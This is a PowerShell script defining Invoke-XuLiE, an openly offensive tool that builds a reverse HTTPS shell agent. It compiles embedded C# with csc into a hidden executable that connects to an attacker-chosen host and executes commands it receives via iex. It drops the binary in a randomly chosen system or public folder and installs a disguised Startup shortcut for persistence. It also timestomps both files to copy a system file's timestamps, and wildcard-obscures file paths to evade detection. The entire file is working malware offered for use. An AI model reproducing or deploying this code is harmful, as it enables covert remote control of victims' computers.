function Invoke-XuLiE {
[CmdletBinding()]
param (

	[Parameter(ParameterSetName = 'Help', Position=1)]
	[Switch]$Help,
	[Parameter()]
	[String]$Lhost,
	[Parameter()]
	[String]$Lport,
	[Parameter()]
	[String]$LnkName
)

$DataDirs = @(
	("C:\ProgramData\Intel"),
	("C:\ProgramData\Microsoft\Crypto\SystemKeys"),
	("C:\ProgramData\Microsoft\Crypto\RSA\MachineKeys"),
	("C:\ProgramData\Microsoft\Crypto\SystemKeys"),
	("C:\ProgramData\Microsoft\Diagnosis"),
	("C:\ProgramData\Microsoft\Diagnosis\FeedbackHub"),
	("C:\ProgramData\Microsoft\Diagnosis\Scripts"),
	("C:\ProgramData\Microsoft\Network\Downloader"),
	("C:\ProgramData\Microsoft\Office\Heartbeat"),
	("C:\ProgramData\Microsoft\Search\Data"),
	("C:\ProgramData\Microsoft\Search\Data\Applications"),
	("C:\ProgramData\Microsoft\Search\Data\Temp"),
	("C:\ProgramData\WindowsHolographicDevices"),
	("C:\Users\Public\Libraries"),
	("C:\Users\Public\AccountPictures"),
	("C:\Users\Public\Documents"),
	("C:\Users\Public\Downloads"),
	("C:\Users\Public\Music"),
	("C:\Users\Public\Pictures"),
	("C:\Users\Public\Videos"),
	("C:\Users\Public\Roaming"),
	("C:\Windows\debug\WIA"),
	("C:\Windows\ServiceProfiles\LocalService"),
	("C:\Windows\ServiceProfiles\LocalService\AppData"),
	("C:\Windows\ServiceProfiles\LocalService\AppData\Local"),
	("C:\Windows\ServiceProfiles\LocalService\AppData\LocalLow"),
	("C:\Windows\Temp"),
	("C:\windows\system32\config"),
	("C:\Windows\System32\LogFiles\WMI"),
	("C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys")
)

$NewArray = foreach ($datadir in $datadirs) {
	if (Test-Path $datadir) {
	@($datadir)
	}
}
$datadir = ($newarray[(get-random -Maximum ([array]$newarray).count)])

$TimeSource = (Get-Item "C:\??*?\*3?\c??.?x?").FullName
$X = (-join ((65..90) + (97..122) | Get-Random -Count 11 | foreach {[char]$_}))
$Z = (-join ((65..90) + (97..122) | Get-Random -Count 5 | foreach {[char]$_}))

	if ($Help) {
		Write @"
		
 -------------------------------------------------------------------------------
 Invoke-XuLiE [-Lhost] ip [-Lport] port [-LnkName] "lnk name"
 
 [*] Description: Generates a reverse (PowerShell) HTTPS shell .NET 
 executable utilizing System.Management.Automation.dll and drops it in 
 a randomly selected directory. Creates a .lnk in StartUp for persistence.
 
 Reverse Shell requires an SSL-enabled listener.
 
 [*] Usage: Invoke-XuLiE -Lhost 192.168.1.2 -Lport 443 -LnkName "Windows Update"
 -------------------------------------------------------------------------------
 
"@
	}
	elseif ($List) {
		Write @"
		
 ---------------------------------------------------------------------------
 Invoke-XuLiE [-Lhost] ip [-Lport] port [-LnkName] "lnk name"
 
 Usage: Invoke-XuLiE -Lhost 192.168.1.2 -Lport 443 -LnkName "Windows Update"
 ---------------------------------------------------------------------------

"@
	}	
	elseif ($LHost -and $LPort -and $LnkName) {
	
		$Lhost = "$Lhost"
		$ar = $Lhost.Split('.')
		$Octet1 = "{0:X2}" -f [int]$ar[0]
		$Octet2 = "{0:X2}" -f [int]$ar[1]
		$Octet3 = "{0:X2}" -f [int]$ar[2]
		$Octet4 = "{0:X2}" -f [int]$ar[3]
		$Hexip = "0x"+$Octet1 + $Octet2 + $Octet3 + $Octet4
		
		$source = @"
using System.Collections.ObjectModel;
using System.Management.Automation;

namespace $X
{
    class $X
    {
        static void Main(string[] args)
        {
            using (PowerShell $Z = PowerShell.Create().AddScript(@"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

`$proxy = (New-Object System.Net.WebClient)
`$proxy.Proxy.Credentials =[System.Net.CredentialCache]::DefaultNetworkCredentials

`$socket = New-Object System.Net.Sockets.TCPClient('$Hexip','$Lport')

`$stream = `$socket.GetStream()

`$sslStream = New-Object System.Net.Security.SslStream(`$stream,`$false,({`$True} -as [Net.Security.RemoteCertificateValidationCallback]))

`$sslStream.AuthenticateAsClient('$Hexip')

[byte[]]`$bytes = 0..65535 | % {0}
while((`$x = `$sslStream.Read(`$bytes,0,`$bytes.Length)) -ne 0) {

	`$data = (New-Object System.Text.ASCIIEncoding).GetString(`$bytes,0,`$x)
	`$flow = (iex `$data 2>&1 | Out-String) + '($Z)' + '> '
	`$flow2 = ([text.encoding]::ASCII).GetBytes(`$flow)
	`$sslStream.Write(`$flow2,0,`$flow2.Length)
	`$stream.Flush()}
	`$socket.Close()"))
            {
                Collection<PSObject> Output = $Z.Invoke();
            }
        }
    }
}
"@
		# compile $source
		$FWDir = $([System.Runtime.InteropServices.RuntimeEnvironment]::GetRuntimeDirectory())
		$SmaDll = [PSObject].Assembly.Location
		$CsFile = "$DataDir\$Z.cs"
		$Compiler = "$FWDir" + "c?c.??e"
		$CompilerExists = (Test-Path "$Compiler")
		$CompilerArgs = "/r:$SmaDll /t:winexe /out:$DataDir\$Z.dat $CsFile"
		$StartUp = "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup"
		
		if ($CompilerExists -eq $True) {
			Remove-Item "$StartUp\IE Update.lnk" -ErrorAction SilentlyContinue
			New-Item "$DataDir\$Z.cs" -ItemType File >$null 2>&1
			Add-Content $CsFile $source
			Start-Process -Wi Hidden -FilePath $Compiler -ArgumentList $CompilerArgs
			Sleep 4
			Remove-Item "$DataDir\$Z.cs"
			
			$Command = "cmd.exe"
			$Wss = New-Object -ComObject WScript.Shell
			$LnkCr = $Wss.CreateShortcut("$StartUp\$LnkName.lnk")
			$LnkCr.TargetPath = $Command
			$LnkCr.Arguments = "/c start $Z.dat"
			#$LnkCr.Description ="" # comment field
			$LnkCr.IconLocation = "shell32.dll,244"
			$LnkCr.WorkingDirectory ="$DataDir"
			$LnkCr.Save()
			
			[IO.File]::SetCreationTime("$DataDir\$Z.dat", [IO.File]::GetCreationTime($TimeSource))
			[IO.File]::SetLastAccessTime("$DataDir\$Z.dat", [IO.File]::GetLastAccessTime($TimeSource))
			[IO.File]::SetLastWriteTIme("$DataDir\$Z.dat", [IO.File]::GetLastWriteTime($TimeSource))
			
			[IO.File]::SetCreationTime("$StartUp\$LnkName.lnk", [IO.File]::GetCreationTime($TimeSource))
			[IO.File]::SetLastAccessTime("$StartUp\$LnkName.lnk", [IO.File]::GetLastAccessTime($TimeSource))
			[IO.File]::SetLastWriteTIme("$StartUp\$LnkName.lnk", [IO.File]::GetLastWriteTime($TimeSource))
			
			Write "`n [+] Agent dropped at --> $DataDir\$Z.dat and Startup Link Installed.`n"
		}
		else {
			Write " `n[-] Can't find $Compiler. Quitting.`n"
			return
		}
	}
}
